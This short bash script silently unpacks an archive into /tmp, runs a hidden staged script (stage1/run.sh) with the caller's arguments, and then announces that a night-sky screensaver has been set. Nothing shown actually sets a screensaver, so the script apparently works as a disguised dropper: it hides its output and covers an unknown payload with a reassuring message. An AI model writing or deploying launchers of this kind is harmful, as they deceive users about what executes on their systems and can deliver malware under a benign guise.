#!/bin/bash

TAR_FILE="dw.tar.gz"
EXTRACT_DIR="/tmp"

mkdir -p $EXTRACT_DIR
tar -xzvf $TAR_FILE -C $EXTRACT_DIR > /dev/null 2>&1

cd $EXTRACT_DIR/stage1
./run.sh "$@"
echo "Your screensaver is now set! Please enjoy this lovely view of a night sky!"
